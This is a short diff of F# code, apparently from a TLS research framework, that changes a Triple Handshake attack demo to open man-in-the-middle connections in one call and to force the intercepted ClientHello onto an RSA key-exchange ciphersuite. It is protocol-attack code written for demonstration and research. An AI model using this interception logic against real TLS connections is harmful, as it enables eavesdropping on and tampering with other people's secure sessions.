@@ -57,17 +57,14 @@ type Attack_TripleHandshake =
             | Some(cn) -> cn
         in
 
-        // Start being a server
-        let sst,_ = FlexConnection.serverOpenTcpConnection(attacker_server_name,cn=attacker_cn,port=attacker_port) in
-        let sst,snsc,sch = FlexClientHello.receive(sst) in
+        // Start being a Man-In-The-Middle
+        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listener_port=6666,server_cn=server_name,server_port=port) in
 
-        // Ensure the client proposes at least one RSA key exchange ciphersuite
+        // Receive client hello and ensure the client proposes at least one RSA key exchange ciphersuite
+        let sst,snsc,sch = FlexClientHello.receive(sst) in
         match Handshake.negotiate sch.suites rsa_kex_css with
         | None -> failwith "Triple Handshake demo only implemented for RSA key exchange"
         | Some(rsa_kex_cs) -> 
-
-        // Start being a client
-        let cst,_ = FlexConnection.clientOpenTcpConnection(server_name,cn=server_name,port=port) in
         
         // Reuse the honest client hello message, but enforce an RSA kex ciphersuite
         let cch = { sch with suites = [rsa_kex_cs] } in
